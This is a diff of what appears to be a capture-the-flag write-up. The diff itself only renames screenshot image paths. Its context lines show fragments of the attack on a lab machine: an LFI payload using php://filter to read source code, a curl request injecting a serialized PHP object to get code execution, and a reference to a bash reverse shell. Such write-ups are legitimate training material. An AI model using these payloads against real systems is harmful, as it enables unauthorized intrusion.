@@ -20,7 +20,7 @@ PORT     STATE SERVICE
 
 Port 80 shows a simple quiz application:
 
-<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (92) (1).png" alt=""><figcaption></figcaption></figure>
 
 If we click any of the buttons, we are shown a very obvious LFI.
 
@@ -42,7 +42,7 @@ http://192.168.183.173/index.php?page=php://filter/convert.base64-encode/resourc
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (105) (5).png" alt=""><figcaption></figcaption></figure>
 
 Here's the PHP code:
 
@@ -117,7 +117,7 @@ $ curl "http://192.168.183.173:8080/index.php?values_submit=O:7:%22MyClass%22:2:
 
 Then, we can verify that we have RCE:
 
-<figure><img src="../../../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (100) (3).png" alt=""><figcaption></figcaption></figure>
 
 Getting reverse shell using the usual `bash` one-liner is easy:
 
